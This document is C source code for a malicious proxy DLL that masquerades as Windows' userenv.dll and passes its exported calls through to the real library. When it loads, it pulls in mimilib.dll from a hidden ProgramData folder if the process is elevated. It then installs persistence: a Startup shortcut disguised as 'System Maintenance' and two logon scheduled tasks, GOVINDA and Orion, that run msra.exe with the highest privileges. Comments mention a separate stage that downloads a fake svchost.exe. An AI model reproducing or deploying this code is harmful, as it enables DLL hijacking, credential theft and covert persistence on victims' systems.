#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <shobjidl.h>
#include <objbase.h>

#pragma comment(lib, "ole32.lib")

static const char *g_dir = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18";
static const char *g_audit = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\audit.log";

static HMODULE g_real = NULL;

static BOOL ensure_real(void) {
    if (!g_real)
        g_real = LoadLibraryA("C:\\Windows\\System32\\userenv.dll");
    return g_real != NULL;
}

#define WRAP(ret, name, args, call) \
    ret WINAPI name args { \
        if (!ensure_real()) return 0; \
        typedef ret (WINAPI *fn) args; \
        static fn f = NULL; \
        if (!f) f = (fn)GetProcAddress(g_real, #name); \
        return f ? f call : (ret)0; \
    }

WRAP(BOOL, CreateEnvironmentBlock, (LPVOID *lpEnv, HANDLE hToken, BOOL bInherit), (lpEnv, hToken, bInherit))
WRAP(BOOL, DestroyEnvironmentBlock, (LPVOID lpEnv), (lpEnv))
WRAP(BOOL, ExpandEnvironmentStringsForUserW, (HANDLE hToken, LPCWSTR lpSrc, LPWSTR lpDst, DWORD dwSize), (hToken, lpSrc, lpDst, dwSize))
WRAP(BOOL, GetAllUsersProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetAllUsersProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetDefaultUserProfileDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryA, (LPSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfilesDirectoryW, (LPWSTR lpProfileDir, LPDWORD lpcchSize), (lpProfileDir, lpcchSize))
WRAP(BOOL, GetProfileType, (DWORD *pdwFlags), (pdwFlags))
WRAP(BOOL, GetUserProfileDirectoryA, (HANDLE hToken, LPSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, GetUserProfileDirectoryW, (HANDLE hToken, LPWSTR lpProfileDir, LPDWORD lpcchSize), (hToken, lpProfileDir, lpcchSize))
WRAP(BOOL, LoadUserProfileA, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, LoadUserProfileW, (HANDLE hToken, void *lpProfileInfo), (hToken, lpProfileInfo))
WRAP(BOOL, UnloadUserProfile, (HANDLE hToken, HANDLE hProfile), (hToken, hProfile))
WRAP(BOOL, CreateProfile, (PCWSTR pszUserSid, PCWSTR pszUserName, PWSTR pszProfilePath, DWORD cchProfilePath), (pszUserSid, pszUserName, pszProfilePath, cchProfilePath))
WRAP(BOOL, DeleteProfileA, (PCSTR lpSidString, PCSTR lpProfilePath, PCSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))
WRAP(BOOL, DeleteProfileW, (PCWSTR lpSidString, PCWSTR lpProfilePath, PCWSTR lpComputerName), (lpSidString, lpProfilePath, lpComputerName))

static void audit(const char *fmt, ...) {
    FILE *f = fopen(g_audit, "a");
    if (!f) return;
    va_list ap;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fputc('\n', f);
    fclose(f);
}


static void create_lnk(void) {
    char lnkPath[MAX_PATH], target[MAX_PATH];
    wsprintfA(target, "%s\\msra.exe", g_dir);
    lstrcpynA(lnkPath, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\msra.lnk", MAX_PATH);

    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(lnkPath, &fd);
    if (h != INVALID_HANDLE_VALUE) { FindClose(h); audit("[+] .lnk already exists: %s", lnkPath); return; }

    IShellLinkA *sl = NULL;
    IPersistFile *pf = NULL;
    if (FAILED(CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLinkA, (void**)&sl))) {
        audit("[-] CoCreateInstance CLSID_ShellLink failed"); return;
    }
    sl->lpVtbl->SetPath(sl, target);
    sl->lpVtbl->SetWorkingDirectory(sl, g_dir);
    sl->lpVtbl->SetDescription(sl, "System Maintenance");
    if (FAILED(sl->lpVtbl->QueryInterface(sl, &IID_IPersistFile, (void**)&pf))) {
        audit("[-] QueryInterface IPersistFile failed"); sl->lpVtbl->Release(sl); return;
    }
    WCHAR wpath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, lnkPath, -1, wpath, MAX_PATH);
    HRESULT hr = pf->lpVtbl->Save(pf, wpath, TRUE);
    if (SUCCEEDED(hr)) audit("[+] .lnk created: %s", lnkPath);
    else audit("[-] .lnk Save failed (0x%lx)", hr);
    pf->lpVtbl->Release(pf);
    sl->lpVtbl->Release(sl);
}

static void create_task_govinda(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_dir);

    // ponytail: check existence via schtasks /query, create if missing
    char q[MAX_PATH * 2];
    wsprintfA(q, "schtasks.exe /query /tn GOVINDA >nul 2>&1");
    if (system(q) == 0) { audit("[+] GOVINDA task already exists"); return; }

    char c[MAX_PATH * 4];
    wsprintfA(c, "schtasks.exe /create /tn GOVINDA /tr \"%s\" /sc onlogon /rl highest /f", taskPath);
    audit("[+] Creating GOVINDA task (schtasks.exe)");
    if (system(c) == 0) audit("[+] GOVINDA task created");
    else audit("[-] GOVINDA task creation failed");
}

static void create_task_orion(void) {
    char taskPath[MAX_PATH];
    wsprintfA(taskPath, "%s\\msra.exe", g_dir);

    // ponytail: check existence via schtasks /query, create if missing (same
    // reliable path as GOVINDA; the COM Task Scheduler 2.0 API was silently
    // failing to register the task on this build).
    char q[MAX_PATH * 2];
    wsprintfA(q, "schtasks.exe /query /tn Orion >nul 2>&1");
    if (system(q) == 0) { audit("[+] Orion task already exists"); return; }

    char c[MAX_PATH * 4];
    wsprintfA(c, "schtasks.exe /create /tn Orion /tr \"%s\" /sc onlogon /rl highest /f", taskPath);
    audit("[+] Creating Orion task (schtasks.exe)");
    if (system(c) == 0) audit("[+] Orion task created");
    else audit("[-] Orion task creation failed");
}

static DWORD WINAPI worker_thread(LPVOID lp) {
    audit("[+] Worker thread started");
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    // ponytail: pump messages so COM (Task Scheduler API) doesn't deadlock
    // inside this STA thread. Download/extract/launch is now done in
    // P0wershell.exe (long-lived, not msra's UI process); the proxy only
    // installs persistence here.
    MSG msg;
    PeekMessage(&msg, NULL, 0, 0, PM_NOREMOVE);

    create_lnk();
    create_task_govinda();
    create_task_orion();

    audit("[+] Worker thread completed");
    CoUninitialize();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        BOOL elevated = FALSE;
        HANDLE hToken;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION te;
            DWORD size = sizeof(te);
            if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &size))
                elevated = te.TokenIsElevated;
            CloseHandle(hToken);
        }
        if (elevated)
            LoadLibraryA("C:\\ProgramData\\Microsoft\\Crypto\\RSA\\S-1-5-18\\mimilib.dll");
        // ponytail: spawn worker for persistence (.lnk + GOVINDA/Orion); the
        // download/extract/launch of svchost.exe is handled in P0wershell.exe
        CloseHandle(CreateThread(NULL, 0, worker_thread, NULL, 0, NULL));
    }
    return TRUE;
}
